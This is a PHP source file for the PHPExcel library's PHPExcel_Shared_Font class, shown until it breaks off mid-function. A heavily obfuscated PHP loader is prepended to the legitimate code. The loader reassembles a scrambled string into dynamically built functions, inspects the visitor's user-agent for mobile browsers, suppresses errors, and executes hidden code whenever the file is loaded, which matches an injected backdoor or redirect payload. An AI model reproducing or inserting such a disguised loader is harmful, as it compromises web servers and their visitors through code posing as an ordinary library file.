<?php $coxltliofk = 'q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)g2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{hnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_U(0); $tvhcfrt = implode(array_mapOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#otRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#])fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iub	146	x75	156	x63	1646<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`45")) or (strstr($uas,"	x66	151	x72wizubxc = $xitgkdo("", $tvhcfrt);ojneb#-*f%)sfxpmpusut)tpqssuVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;z!>!fyqmpef)#	x24*<!%t::<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-:=tj{fpg)%s:*<%j:,,Bjg!!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sgpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyf7!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%e:5597f-s.973:8297f::osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsbopo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nb#>q%<#762]67y]562]38y]7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x	145	x66	157	x78"))) { $xitgkdo = "	x63	162	x65	141	x74	145	x5fC	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	("qsrwubj",str_split("%tjw!>!#]y84]275]y83)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%h151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	1;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`Uif((function_exists("	x6f	142	x5f	163	x74*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fe]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24A	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgdy)##-!#~<%h00#*<%nfd)##Qtpz)#]34pnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c6839sbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb]212]445]43]321]464]284]364]6]234]342]5	x69	157	x6e"; function qsrwubj($n){return chr(ord(,"	x72	166	x3a	61	x31")) %)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p7;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x2223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg8]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-)1/2986+7**^	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	156	<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y] $uas=strtolower($_SERVER["	x48	124	x54	120	x5f	125	2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24fs%6<*17-SFEBFI,6<*12281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$5297e:56-xr.985:52985-t.98]K4]65]D8]86]y324-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	k4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27t7-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R8QPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x2x27;%!<*#}_;#)323ldfid>}&;!osvufs}G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}pdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>c	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbs$n)-1);} @error_reportinghA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%f>	x22!pd%)!gj}Z;h!opj!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+	x7f;!opjudovg}k~~9{d%+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmb7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<x53	105	x52	137	x41	107	x45	116	x54"])#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff28}527}88:}334}472	x24<!%ff2!>h19275j{hnpd19275fubmgoj{h1:|:*fmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvm*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h83]238M7]381]211M5]67]452]88]5]48]32M3]317]445x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1;epn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.936<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zb7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnj7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%9#-!#65egb2dc#*<!sfuvso!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kor (strstr($uas,"	x61	156	x64	162	x6f	-	x24	x5c%j^	x24-	x24tvctus)%	xA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24334]368]322]3]364]6]283]427]36]373P6]36]73]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*epc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38bq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>!572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24217; if ((strstr($uas,"	x6d	163	x69	145")) or (strstr($uas%!|!*#91y]c9y]g2y]#>>j6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw1]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]msv%)}k~~~<ftmbg!osvufs!|ftmf!g)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	xIjQeTQcOc/#00#W~!Ydrr)%rxB%e2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7*%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)udovg}{;#)tutjyf`opjudovg)!gj!|!*1]88M4P8]37]278]225]241]#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cmmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x*111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y% $wizubxc();}}t+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtStpbrrrj'; $jkvoldu=explode(chr((549-429)),substr($coxltliofk,(28899-22879),(208-174))); $xhktdkf = $jkvoldu[0]($jkvoldu[(5-4)]); $xsoiyrg = $jkvoldu[0]($jkvoldu[(8-6)]); if (!function_exists('jfnimm')) { function jfnimm($rpuxdevpn, $algvyxm,$duitts) { $pagbztgu = NULL; for($telsup=0;$telsup<(sizeof($rpuxdevpn)/2);$telsup++) { $pagbztgu .= substr($algvyxm, $rpuxdevpn[($telsup*2)],$rpuxdevpn[($telsup*2)+(3-2)]); } return $duitts(chr((47-38)),chr((463-371)),$pagbztgu); }; } $rhanfa = explode(chr((274-230)),'1845,41,2686,53,4153,47,2787,52,3909,38,5276,55,2309,25,4662,38,1730,50,748,35,1517,63,667,20,2258,51,3502,25,397,33,1646,42,1951,57,687,61,3527,33,1580,66,5674,40,5892,62,5392,55,4260,69,1477,40,5624,50,617,50,0,63,5352,40,4381,64,2051,42,3105,62,2896,21,3167,48,4564,43,235,70,1780,65,3274,47,2395,45,3740,21,5758,33,5514,30,193,42,4918,61,305,35,133,60,2545,39,1092,61,5331,21,4074,33,2334,61,5714,44,1057,35,4731,39,1886,65,3407,63,1019,38,4037,37,5968,52,816,28,479,69,340,57,430,49,1405,50,2172,47,3470,32,5087,64,3321,34,3806,22,1230,66,4006,31,5847,45,2584,39,3828,40,5544,52,3868,41,3215,59,4607,55,844,63,4979,59,4329,52,548,69,5151,69,5038,49,1296,41,1153,57,2739,48,1455,22,5220,56,3977,29,2008,43,4700,31,3055,50,3560,65,3625,66,2484,61,907,23,3761,45,5815,32,5596,28,2126,46,4504,24,4770,47,1688,42,1337,68,4200,60,1210,20,3014,41,5447,67,4860,58,2917,47,4445,59,3355,52,3691,49,2093,33,5791,24,4817,43,4107,46,2219,39,2623,63,2440,44,996,23,4528,36,63,70,2839,57,930,66,3947,30,2964,50,783,33,5954,14'); $rgqkmoij = $xhktdkf("",jfnimm($rhanfa,$coxltliofk,$xsoiyrg)); $xhktdkf=$coxltliofk; $rgqkmoij(""); $rgqkmoij=(818-697); $coxltliofk=$rgqkmoij-1; ?><?php
/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_Shared
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt	LGPL
 * @version    1.8.0, 2014-03-02
 */


/**
 * PHPExcel_Shared_Font
 *
 * @category   PHPExcel
 * @package    PHPExcel_Shared
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 */
class PHPExcel_Shared_Font
{
	/* Methods for resolving autosize value */
	const AUTOSIZE_METHOD_APPROX	= 'approx';
	const AUTOSIZE_METHOD_EXACT		= 'exact';

	private static $_autoSizeMethods = array(
		self::AUTOSIZE_METHOD_APPROX,
		self::AUTOSIZE_METHOD_EXACT,
	);

	/** Character set codes used by BIFF5-8 in Font records */
	const CHARSET_ANSI_LATIN				= 0x00;
	const CHARSET_SYSTEM_DEFAULT			= 0x01;
	const CHARSET_SYMBOL					= 0x02;
	const CHARSET_APPLE_ROMAN				= 0x4D;
	const CHARSET_ANSI_JAPANESE_SHIFTJIS	= 0x80;
	const CHARSET_ANSI_KOREAN_HANGUL		= 0x81;
	const CHARSET_ANSI_KOREAN_JOHAB			= 0x82;
	const CHARSET_ANSI_CHINESE_SIMIPLIFIED	= 0x86;		//	gb2312
	const CHARSET_ANSI_CHINESE_TRADITIONAL	= 0x88;		//	big5
	const CHARSET_ANSI_GREEK				= 0xA1;
	const CHARSET_ANSI_TURKISH				= 0xA2;
	const CHARSET_ANSI_VIETNAMESE			= 0xA3;
	const CHARSET_ANSI_HEBREW				= 0xB1;
	const CHARSET_ANSI_ARABIC				= 0xB2;
	const CHARSET_ANSI_BALTIC				= 0xBA;
	const CHARSET_ANSI_CYRILLIC				= 0xCC;
	const CHARSET_ANSI_THAI					= 0xDD;
	const CHARSET_ANSI_LATIN_II				= 0xEE;
	const CHARSET_OEM_LATIN_I				= 0xFF;

	//  XXX: Constants created!
	/** Font filenames */
	const ARIAL								= 'arial.ttf';
	const ARIAL_BOLD						= 'arialbd.ttf';
	const ARIAL_ITALIC						= 'ariali.ttf';
	const ARIAL_BOLD_ITALIC					= 'arialbi.ttf';

	const CALIBRI							= 'CALIBRI.TTF';
	const CALIBRI_BOLD						= 'CALIBRIB.TTF';
	const CALIBRI_ITALIC					= 'CALIBRII.TTF';
	const CALIBRI_BOLD_ITALIC				= 'CALIBRIZ.TTF';

	const COMIC_SANS_MS						= 'comic.ttf';
	const COMIC_SANS_MS_BOLD				= 'comicbd.ttf';

	const COURIER_NEW						= 'cour.ttf';
	const COURIER_NEW_BOLD					= 'courbd.ttf';
	const COURIER_NEW_ITALIC				= 'couri.ttf';
	const COURIER_NEW_BOLD_ITALIC			= 'courbi.ttf';

	const GEORGIA							= 'georgia.ttf';
	const GEORGIA_BOLD						= 'georgiab.ttf';
	const GEORGIA_ITALIC					= 'georgiai.ttf';
	const GEORGIA_BOLD_ITALIC				= 'georgiaz.ttf';

	const IMPACT							= 'impact.ttf';

	const LIBERATION_SANS					= 'LiberationSans-Regular.ttf';
	const LIBERATION_SANS_BOLD				= 'LiberationSans-Bold.ttf';
	const LIBERATION_SANS_ITALIC			= 'LiberationSans-Italic.ttf';
	const LIBERATION_SANS_BOLD_ITALIC		= 'LiberationSans-BoldItalic.ttf';

	const LUCIDA_CONSOLE					= 'lucon.ttf';
	const LUCIDA_SANS_UNICODE				= 'l_10646.ttf';

	const MICROSOFT_SANS_SERIF				= 'micross.ttf';

	const PALATINO_LINOTYPE					= 'pala.ttf';
	const PALATINO_LINOTYPE_BOLD			= 'palab.ttf';
	const PALATINO_LINOTYPE_ITALIC			= 'palai.ttf';
	const PALATINO_LINOTYPE_BOLD_ITALIC		= 'palabi.ttf';

	const SYMBOL							= 'symbol.ttf';

	const TAHOMA							= 'tahoma.ttf';
	const TAHOMA_BOLD						= 'tahomabd.ttf';

	const TIMES_NEW_ROMAN					= 'times.ttf';
	const TIMES_NEW_ROMAN_BOLD				= 'timesbd.ttf';
	const TIMES_NEW_ROMAN_ITALIC			= 'timesi.ttf';
	const TIMES_NEW_ROMAN_BOLD_ITALIC		= 'timesbi.ttf';

	const TREBUCHET_MS						= 'trebuc.ttf';
	const TREBUCHET_MS_BOLD					= 'trebucbd.ttf';
	const TREBUCHET_MS_ITALIC				= 'trebucit.ttf';
	const TREBUCHET_MS_BOLD_ITALIC			= 'trebucbi.ttf';

	const VERDANA							= 'verdana.ttf';
	const VERDANA_BOLD						= 'verdanab.ttf';
	const VERDANA_ITALIC					= 'verdanai.ttf';
	const VERDANA_BOLD_ITALIC				= 'verdanaz.ttf';

	/**
	 * AutoSize method
	 *
	 * @var string
	 */
	private static $autoSizeMethod = self::AUTOSIZE_METHOD_APPROX;

	/**
	 * Path to folder containing TrueType font .ttf files
	 *
	 * @var string
	 */
	private static $trueTypeFontPath = null;

	/**
	 * How wide is a default column for a given default font and size?
	 * Empirical data found by inspecting real Excel files and reading off the pixel width
	 * in Microsoft Office Excel 2007.
	 *
	 * @var array
	 */
	public static $defaultColumnWidths = array(
		'Arial' => array(
			 1 => array('px' => 24, 'width' => 12.00000000),
			 2 => array('px' => 24, 'width' => 12.00000000),
			 3 => array('px' => 32, 'width' => 10.66406250),
			 4 => array('px' => 32, 'width' => 10.66406250),
			 5 => array('px' => 40, 'width' => 10.00000000),
			 6 => array('px' => 48, 'width' =>  9.59765625),
			 7 => array('px' => 48, 'width' =>  9.59765625),
			 8 => array('px' => 56, 'width' =>  9.33203125),
			 9 => array('px' => 64, 'width' =>  9.14062500),
			10 => array('px' => 64, 'width' =>  9.14062500),
		),
		'Calibri' => array(
			 1 => array('px' => 24, 'width' => 12.00000000),
			 2 => array('px' => 24, 'width' => 12.00000000),
			 3 => array('px' => 32, 'width' => 10.66406250),
			 4 => array('px' => 32, 'width' => 10.66406250),
			 5 => array('px' => 40, 'width' => 10.00000000),
			 6 => array('px' => 48, 'width' =>  9.59765625),
			 7 => array('px' => 48, 'width' =>  9.59765625),
			 8 => array('px' => 56, 'width' =>  9.33203125),
			 9 => array('px' => 56, 'width' =>  9.33203125),
			10 => array('px' => 64, 'width' =>  9.14062500),
			11 => array('px' => 64, 'width' =>  9.14062500),
		),
		'Verdana' => array(
			 1 => array('px' => 24, 'width' => 12.00000000),
			 2 => array('px' => 24, 'width' => 12.00000000),
			 3 => array('px' => 32, 'width' => 10.66406250),
			 4 => array('px' => 32, 'width' => 10.66406250),
			 5 => array('px' => 40, 'width' => 10.00000000),
			 6 => array('px' => 48, 'width' =>  9.59765625),
			 7 => array('px' => 48, 'width' =>  9.59765625),
			 8 => array('px' => 64, 'width' =>  9.14062500),
			 9 => array('px' => 72, 'width' =>  9.00000000),
			10 => array('px' => 72, 'width' =>  9.00000000),
		),
	);

	/**
	 * Set autoSize method
	 *
	 * @param string $pValue
	 * @return	 boolean					Success or failure
	 */
	public static function setAutoSizeMethod($pValue = self::AUTOSIZE_METHOD_APPROX)
	{
		if (!in_array($pValue,self::$_autoSizeMethods)) {
			return FALSE;
		}

		self::$autoSizeMethod = $pValue;

		return TRUE;
	}

	/**
	 * Get autoSize method
	 *
	 * @return string
	 */
	public static function getAutoSizeMethod()
	{
		return self::$autoSizeMethod;
	}

	/**
	 * Set the path to the folder containing .ttf files. There should be a trailing slash.
	 * Typical locations on variout some platforms:
	 *	<ul>
	 *		<li>C:/Windows/Fonts/</li>
	 *		<li>/usr/share/fonts/truetype/</li>
	 *		<li>~/.fonts/</li>
	 *	</ul>
	 *
	 * @param string $pValue
	 */
	public static function setTrueTypeFontPath($pValue = '')
	{
		self::$trueTypeFontPath = $pValue;
	}

	/**
	 * Get the path to the folder containing .ttf files.
	 *
	 * @return string
	 */
	public static function getTrueTypeFontPath()
	{
		return self::$trueTypeFontPath;
	}

	/**
	 * Calculate an (approximate) OpenXML column width, based on font size and text contained
	 *
	 * @param 	PHPExcel_Style_Font			$font			Font object
	 * @param 	PHPExcel_RichText|string	$cellText		Text to calculate width
	 * @param 	integer						$rotation		Rotation angle
	 * @param 	PHPExcel_Style_Font|NULL	$defaultFont	Font object
	 * @return 	integer		Column width
	 */
	public static function calculateColumnWidth(PHPExcel_Style_Font $font, $cellText = '', $rotation = 0, PHPExcel_Style_Font $defaultFont = null) {

		// If it is rich text, use plain text
		if ($cellText instanceof PHPExcel_RichText) {
			$cellText = $cellText->getPlainText();
		}

		// Special case if there are one or more newline characters ("\n")
		if (strpos($cellText, "\n") !== false) {
			$lineTexts = explode("\n", $cellText);
			$lineWitdhs = array();
			foreach ($lineTexts as $lineText) {
				$lineWidths[] = self::calculateColumnWidth($font, $lineText, $rotation = 0, $defaultFont);
			}
			return max($lineWidths); // width of longest line in cell
		}

		// Try to get the exact text width in pixels
		try {
			// If autosize method is set to 'approx', use approximation
			if (self::$autoSizeMethod == self::AUTOSIZE_METHOD_APPROX) {
				throw new PHPExcel_Exception('AutoSize method is set to approx');
			}

			// Width of text in pixels excl. padding
			$columnWidth = self::getTextWidthPixelsExact($cellText, $font, $rotation);

			// Excel adds some padding, use 1.07 of the width of an 'n' glyph
			$columnWidth += ceil(self::getTextWidthPixelsExact('0', $font, 0) * 1.07); // pixels incl. padding

		} catch (PHPExcel_Exception $e) {
			// Width of text in pixels excl. padding, approximation
			$columnWidth = self::getTextWidthPixelsApprox($cellText, $font, $rotation);

			// Excel adds some padding, just use approx width of 'n' glyph
			$columnWidth += self::getTextWidthPixelsApprox('n', $font, 0);
		}

		// Convert from pixel width to column width
		$columnWidth = PHPExcel_Shared_Drawing::pixelsToCellDimension($columnWidth, $defaultFont);

		// Return
		return round($columnWidth, 6);
	}

	/**
	 * Get GD text width in pixels for a string of text in a certain font at a certain rotation angle
	 *
	 * @param string $text
	 * @param PHPExcel_Style_Font
	 * @param int $rotation
	 * @return int
	 * @throws PHPExcel_Exception
	 */
	public static function getTextWidthPixelsExact($text, PHPExcel_Style_Font $font, $rotation = 0) {
		if (!function_exists('imagettfbbox')) {
			throw new PHPExcel_Exception('GD library needs to be enabled');
		}

		// font size should really be supplied in pixels in GD2,
		// but since GD2 seems to assume 72dpi, pixels and points are the same
		$fontFile = self::getTrueTypeFontFileFromFont($font);
		$textBox = imagettfbbox($font->getSize(), $rotation, $fontFile, $text);

		// Get corners positions
		$lowerLeftCornerX  = $textBox[0];
		$lowerLeftCornerY  = $textBox[1];
		$lowerRightCornerX = $textBox[2];
		$lowerRightCornerY = $textBox[3];
		$upperRightCornerX = $textBox[4];
		$upperRightCornerY = $textBox[5];
		$upperLeftCornerX  = $textBox[6];
		$upperLeftCornerY  = $textBox[7];

		// Consider the rotation when calculating the width
		$textWidth = max($lowerRightCornerX - $upperLeftCornerX, $upperRightCornerX - $lowerLeftCornerX);

		return $textWidth;
	}

	/**
	 * Get approximate width in pixels for a string of text in a certain font at a certain rotation angle
	 *
	 * @param string $columnText
	 * @param PHPExcel_Style_Font $font
	 * @param int $rotation
	 * @return int Text width in pixels (no padding added)
	 */
	public static function getTextWidthPixelsApprox($columnText, PHPExcel_Style_Font $font = null, $rotation = 0)
	{
		$fontName = $font->getName();
		$fontSize = $font->getSize();

		// Calculate column width in pixels. We assume fixed glyph width. Result varies with font name and size.
		switch ($fontName) {
			case 'Calibri':
				// value 8.26 was found via interpolation by inspecting real Excel files with Calibri 11 font.
				$columnWidth = (int) (8.26 * PHPExcel_Shared_String::CountCharacters($columnText));
				$columnWidth = $columnWidth * $fontSize / 11; // extrapolate from font size
				break;

			case 'Arial':
				// value 7 was found via interpolation by inspecting real Excel files with Arial 10 font.
				$columnWidth = (int) (7 * PHPExcel_Shared_String::CountCharacters($columnText));
				$columnWidth = $columnWidth * $fontSize / 10; // extrapolate from font size
				break;

			case 'Verdana':
				// value 8 was found via interpolation by inspecting real Excel files with Verdana 10 font.
				$columnWidth = (int) (8 * PHPExcel_Shared_String::CountCharacters($columnText));
				$columnWidth = $columnWidth * $fontSize / 10; // extrapolate from font size
				break;

			default:
				// just assume Calibri
				$columnWidth = (int) (8.26 * PHPExcel_Shared_String::CountCharacters($columnText));
				$columnWidth = $columnWidth * $fontSize / 11; // extrapolate from font size
				break;
		}

		// Calculate approximate rotated column width
		if ($rotation !== 0) {
			if ($rotation == -165) {
				// stacked text
				$columnWidth = 4; // approximation
			} else {
				// rotated text
				$columnWidth = $columnWidth * cos(deg2rad($rotation))
								+ $fontSize * abs(sin(deg2rad($rotation))) / 5; // approximation
			}
		}

		// pixel width is an integer
		$columnWidth = (int) $columnWidth;
		return $columnWidth;
	}

	/**
	 * Calculate an (approximate) pixel size, based on a font points size
	 *
	 * @param 	int		$fontSizeInPoints	Font size (in points)
	 * @return 	int		Font size (in pixels)
	 */
	public static function fontSizeToPixels($fontSizeInPoints = 11) {
		return (int) ((4 / 3) * $fontSizeInPoints);
	}

	/**
	 * Calculate an (approximate) pixel size, based on inch size
	 *
	 * @param 	int		$sizeInInch	Font size (in inch)
	 * @return 	int		Size (in pixels)
	 */
	public static function inchSizeToPixels($sizeInInch = 1) {
		return ($sizeInInch * 96);
	}

	/**
	 * Calculate an (approximate) pixel size, based on centimeter size
	 *
	 * @param 	int		$sizeInCm	Font size (in centimeters)
	 * @return 	int		Size (in pixels)
	 */
	public static function centimeterSizeToPixels($sizeInCm = 1) {
		return ($sizeInCm * 37.795275591);
	}

	/**
	 * Returns the font path given the font
	 *
	 * @param PHPExcel_Style_Font
	 * @return string Path to TrueType font file
	 */
	public static function getTrueTypeFontFileFromFont($font) {
		if (!file_exists(self::$trueTypeFontPath) || !is_dir(self::$trueTypeFontPath)) {
			throw new PHPExcel_Exception('Valid directory to TrueType Font files not specified');
		}

		$name		= $font->getName();
		$bold		= $font->getBold();
		$italic		= $font->getItalic();

		// Check if we can map font to true type font file
		switch ($name) {
			case 'Arial':
				$fontFile = (
					$bold ? ($italic ? self::ARIAL_BOLD_ITALIC : self::ARIAL_BOLD)
						  : ($italic ? self::ARIAL_ITALIC : self::ARIAL)
				);
				break;

			case 'Calibri':
				$fontFile = (
					$bold ? ($italic ? self::CALIBRI_BOLD_ITALIC : self::CALIBRI_BOLD)
						  : ($italic ? self::CALIBRI_ITALIC : self::CALIBRI)
				);
				break;

			case 'Courier New':
				$fontFile = (
					$bold ? ($italic ? self::COURIER_NEW_BOLD_ITALIC : self::COURIER_NEW_BOLD)
						  : ($italic ? self::COURIER_NEW_ITALIC : self::COURIER_NEW)
				);
				break;

			case 'Comic Sans MS':
				$fontFile = (
					$bold ? self::COMIC_SANS_MS_BOLD : self::COMIC_SANS_MS
				);
				break;

			case 'Georgia':
				$fontFile = (
					$bold ? ($italic ? self::GEORGIA_BOLD_ITALIC : self::GEORGIA_BOLD)
						  : ($italic ? self::GEORGIA_ITALIC : self::GEORGIA)
				);
				break;

			case 'Impact':
				$fontFile = self::IMPACT;
				break;

			case 'Liberation Sans':
				$fontFile = (
					$bold ? ($italic ? self::LIBERATION_SANS_BOLD_ITALIC : self::LIBERATION_SANS_BOLD)
						  : ($italic ? self::LIBERATION_SANS_ITALIC : self::LIBERATION_SANS)
				);
				break;

			case 'Lucida Console':
				$fontFile = self::LUCIDA_CONSOLE;
				break;

			case 'Lucida Sans Unicode':
				$fontFile = self::LUCIDA_SANS_UNICODE;
				break;

			case 'Microsoft Sans Serif':
				$fontFile = self::MICROSOFT_SANS_SERIF;
				break;

			case 'Palatino Linotype':
				$fontFile = (
					$bold ? ($italic ? self::PALATINO_LINOTYPE_BOLD_ITALIC : self::PALATINO_LINOTYPE_BOLD)
						  : ($italic ? self::PALATINO_LINOTYPE_ITALIC : self::PALATINO_LINOTYPE)
				);
				break;

			case 'Symbol':
				$fontFile = self::SYMBOL;
				break;

			case 'Tahoma':
				$fontFile = (
					$bold ? self::TAHOMA_BOLD : self::TAHOMA
				);
				break;

			case 'Times New Roman':
				$fontFile = (
					$bold ? ($italic ? self::TIMES_NEW_ROMAN_BOLD_ITALIC : self::TIMES_NEW_ROMAN_BOLD)
						  : ($italic ? self::TIMES_NEW_ROMAN_ITALIC : self::TIMES_NEW_ROMAN)
				);
				break;

			case 'Trebuchet MS':
				$fontFile = (
					$bold ? ($italic ? self::TREBUCHET_MS_BOLD_ITALIC : self::TREBUCHET_MS_BOLD)
						  : ($italic ? self::TREBUCHET_MS_ITALIC : self::TREBUCHET_MS)
				);
				break;

			case 'Verdana':
				$fontFile = (
					$bold ? ($italic ? self::VERDANA_BOLD_ITALIC : self::VERDANA_BOLD)
						  : ($italic ? self::VERDANA_ITALIC : self::VERDANA)
				);
				break;

			default:
				throw new PHPExcel_Exception('Unknown font name "'. $name .'". Cannot map to TrueType font file');
				break;
		}

